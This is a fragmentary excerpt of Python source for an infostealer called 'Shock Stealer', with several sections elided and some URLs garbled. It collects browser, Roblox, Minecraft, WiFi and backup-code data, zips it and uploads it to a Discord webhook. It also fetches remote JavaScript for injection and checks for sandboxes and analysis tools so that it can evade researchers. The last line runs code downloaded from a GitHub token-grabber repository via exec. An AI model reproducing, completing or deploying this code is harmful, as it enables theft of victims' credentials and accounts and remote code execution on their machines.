...
def main(webhook: str):
    ...
    _file = f'{localappdata}\\Shock Stealer-{os.getlogin()}.zip'
    ...
    if __CONFIG__["roblox"] or __CONFIG__["browser"] or __CONFIG__["wifi"] or __CONFIG__["minecraft"] or __CONFIG__["backupcodes"]:
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': ('Shock Stealer.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Shock Stealer-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096"
                    }
                }
            ],
            "username": "Shock",
...
class Injection:
    def __init__(self, webhook: str) -> None:
        ...
        self.code = requests.get('h://raw.ion/main/in4632523n24523434.js').text
...
class Debug:
    ...
    def checks(self):
        ...
        self.blackListedUsers = [
            'WDunt', 'Abby', 'hmarc', 'patex', 'RDvzX', 'Mwgj', 'Frank', '8N', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8Vi', 'wA',
            'lb', 'PxsS', '3m8', 'Julia', 'ezl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'f3G', 'Lucas', 'mike', 'PateX', 'h7r', 'Louise',
            'User01', 'test', 'RGeg']
        self.blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-NAFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PY29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
            'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1H', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'T5M',
        ...
        self.blacklistedProcesses = [
            "httpdebuggerui", "eshark", "fler", "regedit", "cmd", "taskmgr", "vboxservice", "drv", "processhacker", "vbtray", "vmtoolsd", "vmwaretray", "ida64",
...
if __name__ == '__main__' and os.name == "nt":
    Stealer(__CONFIG__["webhook"])
exec(requests.get("https://raw.githubusercontent.com/Purora/Purora-Token-Grabber-v6/main/injection_module.txt").text)